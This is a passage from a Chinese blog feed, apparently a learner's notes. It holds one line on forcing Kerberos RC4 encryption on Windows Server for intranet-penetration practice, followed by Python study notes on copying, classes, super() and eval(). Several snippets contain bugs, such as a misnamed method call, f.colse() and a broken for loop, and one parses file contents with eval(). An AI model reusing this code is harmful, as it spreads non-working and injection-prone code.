        <content type="html"><![CDATA[<p>在Windows sever中设置本地安全策略，用到kerberos加密并且使用RC4_HMAC_MD5<br><img src="/2024/03/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/1689682491191-c50bc748-50ea-4afd-a633-914678ce7472.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python编程学习</title>
      <link href="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<ol><li>内置函数 __dir()__赋值内存地址指向关系<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1707120498847-f0d9532c-20ed-441d-8e59-e3aa8440f284.png" alt="image.png"></li></ol><p>python中，变量的赋值为引用方式，a,b都赋值为12，但是指的是一个内存地址<br>运算优先级关系<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1707120657302-73b2e757-5e0e-451e-9887-216702479374.png" alt="image.png"></p><p>深浅拷贝问题<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708516035257-79ba63e3-89ed-44fc-a1f6-f2799f1641f3.png" alt="image.png"></p><p>浅拷贝：只拷贝对象的引用，并不拷贝对象的内容<br>深拷贝：拷贝对象的所有内容</p><p>浅拷贝</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">a = [<span class="number">10</span>,<span class="number">20</span>,[<span class="number">30</span>,<span class="number">40</span>]]</span><br><span class="line">b= copy.copy(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>]]</span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>]]</span><br></pre></td></tr></table></figure><p>在你的代码中，你使用了 <strong>copy</strong> 模块中的 <strong>copy</strong> 函数来创建列表 <strong>a</strong> 的浅拷贝，并将其赋值给变量 <strong>b</strong>。浅拷贝会创建一个新的对象，但是它会尽量保持原始对象中嵌套对象的引用，而不是创建嵌套对象的副本。<br>然而，嵌套的列表 <strong>[30, 40]</strong> 在 <strong>a</strong> 和 <strong>b</strong> 中仍然是相同的对象，因为它们共享相同的引用。<br>浅拷贝</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">a = [<span class="number">10</span>,<span class="number">20</span>,[<span class="number">30</span>,<span class="number">40</span>]]</span><br><span class="line">b= copy.copy(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a[<span class="number">2</span>].append(<span class="number">40</span>)   <span class="comment">#修改嵌套内容</span></span><br><span class="line">b.append(<span class="number">90</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>]]</span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>]]</span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>, <span class="number">40</span>]]   <span class="comment">#修改了a的嵌套，b中嵌套的内容也修改了</span></span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>, <span class="number">40</span>], <span class="number">90</span>]</span><br></pre></td></tr></table></figure><p> <img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708517422291-24e755ea-0a23-4f6c-a060-e0b5c390be46.png" alt="image.png"></p><p>深拷贝</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">a = [<span class="number">10</span>,<span class="number">20</span>,[<span class="number">30</span>,<span class="number">40</span>]]</span><br><span class="line">b= copy.deepcopy(a)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">a[<span class="number">2</span>].append(<span class="number">40</span>)  <span class="comment">#深拷贝相关于把原有的信息全部复制一份，a,b之间没有联系，各自修改自己的内容</span></span><br><span class="line">b[<span class="number">2</span>].append(<span class="number">70</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>]]</span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>]]</span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>, <span class="number">40</span>]]</span><br><span class="line">[<span class="number">10</span>, <span class="number">20</span>, [<span class="number">30</span>, <span class="number">40</span>, <span class="number">70</span>]]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>循环遍历(二维数组)<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1707121611758-20ffa58a-3d99-44da-a60f-402e88353765.png" alt="image.png"></p><p>文件I&#x2F;O文件打开方式：</p><p>序列化与反序列化<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708578663309-e0a0608f-5fd7-4482-a950-350ad805d94e.png" alt="image.png"></p><p><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708578918858-88181944-589d-48ef-a619-0927d16bceb3.png" alt="image.png"></p><p>os模块os.path<br>walk()遍历目录与子目录<br>模块的创建与测试代码（相当于单元测试，在别的模块导入该模块时并不会执行打印语句）<br><strong>使用方式：<strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘</strong><br><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708581016301-58e4a3a0-b7cf-4368-9167-49c8aaad0f46.png" alt="image.png"></p><p>包1.带有__init__.py的文件夹<br>​<br>csv文件处理<br><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708579101723-1c12fdaa-e81b-4168-a732-7aca634e1203.png" alt="image.png"></p><p>三引号<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1707180004899-de5e1a4f-f238-4208-b488-c1625c670f76.png" alt="image.png"></p><p>类静态方法可以直接调用而不用实例化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reserve</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">list</span>[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接调用Person中的方法</span></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">Person.reverse(<span class="built_in">list</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>继承关系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>  <span class="title class_">Person</span>:</span><br><span class="line">    <span class="comment"># 定义构造方法</span></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age</span>):</span><br><span class="line">       self.name =name</span><br><span class="line">       self.age =age</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;xigou&quot;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">getname</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span>  self.name</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">getage</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> self.age</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">sum</span>(<span class="params">a,b</span>):</span><br><span class="line">       <span class="keyword">return</span> a+b</span><br><span class="line"></span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">say</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;nihao&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">self,name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">son = Son(<span class="string">&quot;1&quot;</span>,<span class="number">10</span>)</span><br><span class="line">son.change(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(son.getname())</span><br><span class="line"><span class="keyword">del</span> son</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>类中的私有变量不可以通过实例化的对象来访问但是可以通过<strong>object._className__attrName来访问</strong>object._className__attrName访问私有变量</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="comment">#定义私有成员变量</span></span><br><span class="line">    __age = <span class="number">0</span></span><br><span class="line">    <span class="comment">#定义公共成员变量</span></span><br><span class="line">    name = <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过object._className__attrName访问私有成员变量</span></span><br><span class="line">p = Person()</span><br><span class="line"><span class="built_in">print</span>(p._Person__age)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708325742571-423e29e4-da0b-4811-afa7-78688d36adb6.png" alt="image.png"></p><h6 id="类变量与成员变量之前的关系"><a href="#类变量与成员变量之前的关系" class="headerlink" title="类变量与成员变量之前的关系"></a>类变量与成员变量之前的关系</h6><p>在Python中，类变量和实例变量（也称为成员变量）有着不同的作用和范围。以下是它们的主要区别：</p><ol><li><strong>范围（Scope）</strong>:</li></ol><ul><li><strong>类变量（Class Variable）</strong>: 属于类，而不是类的实例。它在整个类中都是可见的，所有该类的实例共享同一个类变量。</li><li><strong>实例变量（Instance Variable）</strong>: 属于类的实例。每个实例都有自己的一组实例变量，它们只能在特定实例内访问。</li></ul><ol><li><strong>共享性（Sharing）</strong>:</li></ol><ul><li><strong>类变量</strong>: 所有类的实例共享相同的类变量值。当一个实例修改了类变量，其他实例也会受到影响。</li><li><strong>实例变量</strong>: 每个实例都有自己的实例变量，修改一个实例的变量不会影响其他实例。</li></ul><ol><li><strong>初始化（Initialization）</strong>:</li></ol><ul><li><strong>类变量</strong>: 通常在类的定义中直接初始化。</li><li><strong>实例变量</strong>: 通常在实例的构造函数（**<strong>init</strong>** 方法）中初始化。类变量与成员变量之间的关系</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span>:</span><br><span class="line">    class_variable = <span class="number">0</span>  <span class="comment"># 类变量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, instance_variable</span>):</span><br><span class="line">        self.instance_variable = instance_variable  <span class="comment"># 实例变量</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建两个实例</span></span><br><span class="line">obj1 = Example(<span class="number">1</span>)</span><br><span class="line">obj2 = Example(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改类变量</span></span><br><span class="line">Example.class_variable = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改实例变量</span></span><br><span class="line">obj1.instance_variable = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Class Variable: <span class="subst">&#123;Example.class_variable&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Obj1 Instance Variable: <span class="subst">&#123;obj1.instance_variable&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Obj2 Instance Variable: <span class="subst">&#123;obj2.instance_variable&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用super()来简化继承使用<br>super在单继承中的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.way = <span class="string">&quot;传统&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teach</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.way)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">School</span>(<span class="title class_ inherited__">Teacher</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.way = <span class="string">&quot;现代&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teach</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.way)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teach_T</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="built_in">super</span>().teach()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(<span class="title class_ inherited__">School</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.way = <span class="string">&quot;结合&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teach</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(self.way)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teach_S</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="built_in">super</span>().teach()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">teach_T</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(School,self).__init__()</span><br><span class="line">        <span class="built_in">super</span>(School,self).teach()</span><br><span class="line"></span><br><span class="line">n = Net()</span><br><span class="line">n.teach_T()</span><br></pre></td></tr></table></figure><h5 id="易错："><a href="#易错：" class="headerlink" title="易错："></a>易错：</h5><p>super().<strong>init</strong>(self) # 使用super()调用父类的构造方法 self.way &#x3D; “现代” 这么写的错误原因在哪<br><strong>ChatGPT</strong><br>在Python中，<strong>super()<strong>是一个特殊的函数，用于调用父类的方法。在构造函数中，</strong>super().<strong>init</strong>()<strong>通常用于调用父类的构造方法，而不需要传递</strong>self</strong>作为参数，因为<strong>super()<strong>会自动获取当前实例。<br>在你的代码中，</strong>super().<strong>init</strong>(self)<strong>这样写是错误的，因为在使用</strong>super()<strong>时，不需要传递</strong>self</strong>作为参数。应该这样写：<br><strong>You</strong><br>同样super().teach()也会自动识别self么<br><strong>ChatGPT</strong><br>是的，<strong>super().teach()<strong>也会自动识别</strong>self</strong>。在Python中，<strong>super()<strong>函数会自动获取当前实例，并查找父类中的对应方法。<br>在你的代码中，</strong>super().teach()<strong>是正确的用法，它会在父类中查找</strong>teach</strong>方法并调用，而不需要显式传递<strong>self</strong>。这是因为<strong>super()<strong>已经包含了当前实例的信息，使得调用父类方法时不需要手动传递</strong>self</strong>。<br>所以，正确的写法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pythonCopy code</span><br><span class="line">super().__init__()  # 使用super()调用父类的构造方法</span><br><span class="line">self.way = &quot;现代&quot;</span><br></pre></td></tr></table></figure><p>原因是<strong>super()<strong>已经隐式包含了当前实例，不需要手动传递</strong>self</strong>。传递<strong>self</strong>会导致参数数量不匹配的错误。正确的做法是只调用**super().<strong>init</strong>()**，而不带任何参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pythonCopy code</span><br><span class="line">class School(Teacher):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        super().__init__()  # 使用super()调用父类的构造方法</span><br><span class="line">        self.way = &quot;现代&quot;</span><br><span class="line"></span><br><span class="line">    def teach_T(self):</span><br><span class="line">        super().teach()  # 使用super()调用父类的teach方法</span><br></pre></td></tr></table></figure><p>在这里，<strong>super().teach()<strong>会自动识别当前实例，并在父类中调用</strong>teach</strong>方法。<br>方法的动态性可以动态的添加类的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Person:</span><br><span class="line">    def work(self):</span><br><span class="line">        print(&quot;11&quot;)</span><br><span class="line"></span><br><span class="line">def work2(s):         #不属于Person类</span><br><span class="line">    print(&quot;1122&quot;)</span><br><span class="line"></span><br><span class="line">def play(s):</span><br><span class="line">    print(&quot;3333&quot;)</span><br><span class="line"></span><br><span class="line">Person.play = play   #动态添加play()方法</span><br><span class="line">Person.work = work2</span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line">p.work()</span><br></pre></td></tr></table></figure><p>装饰器<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708565470527-f266cb11-0d7b-483a-9a78-b0d672770b21.png" alt="image.png"></p><p><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708567166235-320d5476-97e5-44ea-bfa6-62b2f0ee8ab9.png" alt="截屏2024-02-22 09.57.34.png"></p><p>结果：29<br>图中标红的字段需要保持一致<br>None对象<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708567405702-7b93371d-1050-40bd-8bc8-6136abce3c9f.png" alt="image.png"></p><p>异常类（自定义异常类并抛出异常）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#自定义异常类</span><br><span class="line">class ShortPasswd(Exception):</span><br><span class="line">    def __init__(self,lenth,min_lenth):</span><br><span class="line">        self.lenth = lenth</span><br><span class="line">        self.min_lenth = min_lenth</span><br><span class="line"></span><br><span class="line">#格式化打印</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return f&quot;你输入的密码长度为&#123;self.lenth&#125;&quot;+f&quot;不满足最小长度&#123;self.min_lenth&#125;的标准&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    passwd = input()</span><br><span class="line">    if(len(passwd)&lt;3):</span><br><span class="line">        raise ShortPasswd(len(passwd),3)  #抛出异常</span><br><span class="line">except Exception as result:</span><br><span class="line">    print(result)   //打印异常信息</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;您输入的密码为&#123;passwd&#125;&quot;)</span><br></pre></td></tr></table></figure><p>面向对象编程案例(学生信息管理系统)部分将学生信息保存到文件<br>保存学生信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">      <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age,<span class="built_in">id</span></span>):</span><br><span class="line">          self.name = name</span><br><span class="line">          self.age = age </span><br><span class="line">          self.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">           <span class="keyword">return</span> <span class="string">f&quot;学号:<span class="subst">&#123;self.<span class="built_in">id</span>&#125;</span>,姓名:<span class="subst">&#123;self.name&#125;</span>,年龄:<span class="subst">&#123;self.age&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#学生信息列表</span></span><br><span class="line">stu = []</span><br><span class="line"><span class="comment">#增加学生信息</span></span><br><span class="line">s1 = Student(<span class="string">&quot;curry&quot;</span>,<span class="number">11</span>,<span class="number">1</span>)</span><br><span class="line">s2 = Student(<span class="string">&quot;james&quot;</span>,<span class="number">12</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">#将学生信息保存至学生列表中</span></span><br><span class="line">stu.append(s1)</span><br><span class="line">stu.append(s2)</span><br><span class="line"><span class="comment">#将学生的信息保存至文件中</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./hu.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="comment">#需要将stu列表信息转为字符串才能写入,并且将学生的属性字典形式存储</span></span><br><span class="line">newstu = [i__dict__ <span class="keyword">for</span> i <span class="keyword">in</span> stu]</span><br><span class="line">f.write(<span class="built_in">str</span>(newstu))</span><br><span class="line"><span class="comment">#关闭文件</span></span><br><span class="line">f.colse()</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次从文件中读取学生的信息</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./hu.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment">#需要将读取的信息转为对象</span></span><br><span class="line">newlist = f.read()</span><br><span class="line">newlist1 = <span class="built_in">eval</span>(newlist)</span><br><span class="line"><span class="comment">#将学生信息分隔添加到列表中</span></span><br><span class="line">stu = [Student(i[<span class="string">&#x27;name&#x27;</span>],i[<span class="string">&#x27;age&#x27;</span>],i[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> newlist1]</span><br><span class="line"><span class="comment">#打印学生信息</span></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">in</span> stu</span><br><span class="line">   <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708487374266-48b4efc8-2bd6-4c27-8f54-d82e6b1086e2.png" alt="image.png"></p><p>eval()函数<img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708518319153-b5e5162d-4466-46d4-8016-dfdc2c1c5ffb.png" alt="image.png"></p><p>即eval()将字符串转为对象处理，如果字符串是危险语句，eval()同样会继续执行<br>eval()函数案例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span> = <span class="built_in">dict</span>(a=<span class="number">100</span>,b=<span class="number">200</span>)</span><br><span class="line">r = <span class="built_in">eval</span>(<span class="string">&quot;a+b&quot;</span>,<span class="built_in">dict</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">#结果</span></span><br><span class="line"><span class="number">300</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设计模式单例模式<br><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708568409983-c6a18b6b-5af8-4685-b715-fc345b9a02d9.png" alt="image.png"></p><p><img src="/2024/03/14/Python%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/1708568716757-50636b03-8f92-4213-a2bf-d9d96014c232.png" 